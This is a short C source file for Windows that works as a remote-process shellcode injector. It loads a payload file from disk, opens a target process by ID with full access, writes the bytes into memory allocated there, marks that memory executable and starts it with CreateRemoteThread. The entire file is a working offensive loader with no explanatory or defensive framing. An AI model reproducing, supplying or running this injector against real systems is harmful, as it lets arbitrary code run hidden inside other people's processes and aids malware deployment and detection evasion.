#include <windows.h>
#include <stdio.h>

LPVOID LoadFileIntoMemory( LPSTR Path, PDWORD MemorySize ) {
    PVOID  ImageBuffer = NULL;
    DWORD  dwBytesRead = 0;
    HANDLE hFile       = NULL;

    hFile = CreateFileA( Path, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf( "Error opening %s\r\n", Path );
        return NULL;
    }

    if ( MemorySize )
        *MemorySize = GetFileSize( hFile, 0 );
    ImageBuffer = ( PBYTE ) LocalAlloc( LPTR, *MemorySize );

    ReadFile( hFile, ImageBuffer, *MemorySize, &dwBytesRead, 0 );
    CloseHandle( hFile );

    return ImageBuffer;
}

typedef void ( * ShellcodeMain )();

int main( int argc, char** argv )
{
    PVOID  ShellcodeBytes = NULL;
    DWORD  ShellcodeSize  = 0;
    DWORD  OldProtection  = 0;
    DWORD  ThreadId       = 0;
    HANDLE TargetProcess  = 0;

    LPVOID  ShellcodeMemory = NULL;

    if ( argc < 3 )
    {
        printf( "[-] %s <shellcode path>\n", argv[ 0 ] );
        return 0;
    }

    ShellcodeBytes  = LoadFileIntoMemory( argv[ 2 ], &ShellcodeSize );
    TargetProcess   = OpenProcess( PROCESS_ALL_ACCESS, FALSE, atoi( argv[ 1 ] ) );
    ShellcodeMemory = VirtualAllocEx( TargetProcess, NULL, ShellcodeSize, MEM_COMMIT, PAGE_READWRITE );

    if ( ! ShellcodeMemory )
    {
        printf("[-] Failed to allocate Virtual Memory\n");
        return 0;
    }

    printf( "[*] Address => %p [%d bytes]\n", ShellcodeMemory, ShellcodeSize );

    WriteProcessMemory( TargetProcess, ShellcodeMemory, ShellcodeBytes, ShellcodeSize, NULL );
    //memcpy( ShellcodeMemory, ShellcodeBytes, ShellcodeSize );

    VirtualProtectEx( TargetProcess, ShellcodeMemory, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection );

    puts("[+] Execute shellcode... press enter");
    getchar();

    CreateRemoteThread( TargetProcess, NULL, NULL, ShellcodeMemory, NULL, NULL, &ThreadId );

    printf( "[+] Running in thread id: %d\n", ThreadId );
    //WaitForSingleObject( CreateThread( NULL, NULL, ShellcodeMemory, NULL, NULL, NULL ), INFINITE ); //((ShellcodeMain)ShellcodeMemory)();
}